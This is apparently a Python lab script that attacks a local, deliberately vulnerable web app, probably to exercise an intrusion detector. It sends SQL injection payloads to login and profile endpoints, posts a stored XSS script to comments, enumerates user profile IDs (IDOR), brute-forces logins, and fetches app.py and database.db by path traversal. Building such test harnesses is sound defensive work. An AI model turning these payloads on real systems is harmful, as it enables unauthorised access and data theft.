import requests
import random
import string
import time
import re

BASE = "http://127.0.0.1:5000"
TIMEOUT = 5

#AUX
def banner(titulo: str):
    print("\n" + "=" * 55)
    print(titulo)
    print("=" * 55)

def random_key(n=6):
    return "".join(
        random.choice(string.ascii_lowercase)
        for _ in range(n)
    )

#SQLINJECTION
def sqlinject():
    banner("[+] TESTE SQL INJECTION")

    payload = "' OR 1=1 --"


    # SQLi no login
    r = requests.post(
        BASE + "/login",
        data={
            "username": payload,
            "password": "0000"
        },
        timeout=TIMEOUT
    )

    print(
        "[FORM] POST /login =>",
        r.status_code
    )


    # SQLi no PATH
    # Detectável pelo vigilante, mas não funciona
    url_payload = "/login" + payload.replace(" ", "%20")

    r = requests.get(
        BASE + url_payload,
        timeout=TIMEOUT
    )

    print(
        "[PATH] GET",
        url_payload,
        "=>",
        r.status_code
    )

    # SQLi no parâmetro id do perfil
    sessao = requests.Session()

    sessao.post(
        BASE + "/login",
        data={
            "username": "ana",
            "password": "123456"
        },
        allow_redirects=True,
        timeout=TIMEOUT
    )

    r = sessao.get(
        BASE + "/perfil?id=1 OR 1=1",
        allow_redirects=False,
        timeout=TIMEOUT
    )

    print(
        "[GET] /perfil?id=1 OR 1=1 =>",
        r.status_code
    )

    sessao.get(
        BASE + "/logout",
        allow_redirects=True,
        timeout=TIMEOUT
    )

# XSS
def xss():
    banner("[+] TESTE XSS")

    payload = "<script>alert('Hack perigoso')</script>"

    dados = {
        "user": "hackerman",
        "content": payload
    }

    r = requests.post(
        BASE + "/comentarios",
        data=dados,
        timeout=TIMEOUT
    )

    print(
        "[POST] /comentarios =>",
        r.status_code
    )

#IDOR
def extrair_meu_id(html: str):

    resultado = re.search(
        r"<b>\s*ID:\s*</b>\s*([0-9]+)",
        html,
        flags=re.IGNORECASE
    )

    if resultado:
        return resultado.group(1)

    return None


def idor(max_id=25):
    banner("[+] TESTE IDOR")

    sessao = requests.Session()
    # Login necessário para acessar /perfil
    r = sessao.post(
        BASE + "/login",
        data={
            "username": "ana",
            "password": "123456"
        },
        allow_redirects=True,
        timeout=TIMEOUT
    )

    print(
        "[LOGIN] status:",
        r.status_code
    )

    # Descobrir ID da própria sessão
    r = sessao.get(
        BASE + "/perfil",
        allow_redirects=True,
        timeout=TIMEOUT
    )

    meu_id = extrair_meu_id(r.text)
    if not meu_id:
        print(
            "[-] Não consegui descobrir "
            "meu ID no HTML do /perfil."
        )

        sessao.get(
            BASE + "/logout",
            allow_redirects=True,
            timeout=TIMEOUT
        )

        return

    print("[+] Meu ID:", meu_id)


    #Base
    baseline = sessao.get(
        BASE + f"/perfil?id={meu_id}",
        allow_redirects=False,
        timeout=TIMEOUT
    )

    print(
        "[BASELINE] /perfil?id=meu_id =>",
        baseline.status_code
    )

    # Varredura de IDs
    for user_id in range(1, max_id + 1):

        if str(user_id) == str(meu_id):
            continue

        r = sessao.get(
            BASE + f"/perfil?id={user_id}",
            allow_redirects=False,
            timeout=TIMEOUT
        )

        if r.status_code == 200:
            print(
                f"[IDOR VULNERÁVEL] id={user_id}"
            )

        else:
            print(
                f"[SEM ACESSO] id={user_id} "
                f"status={r.status_code}"
            )

    sessao.get(
        BASE + "/logout",
        allow_redirects=True,
        timeout=TIMEOUT
    )
# BRUTE FORCE
def brute(tentativas=12, delay=0.4):
    banner(
        f"[+] TESTE BRUTE FORCE "
        f"POST /login x{tentativas}"
    )

    for tentativa in range(1, tentativas + 1):

        username = random_key()
        password = random_key()

        try:
            resposta = requests.post(
                BASE + "/login",
                data={
                    "username": username,
                    "password": password
                },
                timeout=TIMEOUT
            )

            print(
                f"{tentativa:02d} -> "
                f"{username}:{password} | "
                f"{resposta.status_code}"
            )

        except requests.RequestException as erro:
            print(
                f"[-] Erro de conexão: {erro}"
            )
            return

        time.sleep(delay)

    print("[+] Simulação de Brute Force encerrada")

# PATH TRAVERSAL
def path_traversal():
    banner("[+] TESTE PATH TRAVERSAL")

    caminho = "../../app.py"

    r = requests.get(
        BASE + "/download",
        params={"file": caminho},
        allow_redirects=False,
        timeout=TIMEOUT
    )

    print(
        f"[GET] file={caminho} =>",
        r.status_code
    )

    if r.status_code == 200:
        print(
            "[+] Requisição aceita pelo endpoint vulnerável"
        )

# FILE DISCLOSURE
def file_disclosure():
    banner("[+] TESTE FILE DISCLOSURE")

    arquivo = "database.db"

    r = requests.get(
        BASE + "/download",
        params={"file": arquivo},
        allow_redirects=False,
        timeout=TIMEOUT
    )

    print(
        f"[GET] file={arquivo} =>",
        r.status_code
    )

    if r.status_code != 200:
        print("[-] Arquivo não retornado")
        return

    if b"SQLite format 3" in r.content[:32]:
        print(
            "[+] FILE DISCLOSURE CONFIRMADO: "
            "database.db retornado"
        )

    else:
        print(
            "[?] HTTP 200 recebido, "
            "mas o conteúdo não parece SQLite"
        )


# =========================================================
# EXECUÇÃO
# =========================================================

if __name__ == "__main__":

# use comentario para ativar e desativar funçoes
    sqlinject()
    xss()
    idor(max_id=25)
    # Evita que os POSTs legítimos/SQLi anteriores ainda
    # estejam dentro da janela temporal do detector.
    time.sleep(21)
    brute(tentativas=20,delay=0.5)
    path_traversal()
    file_disclosure()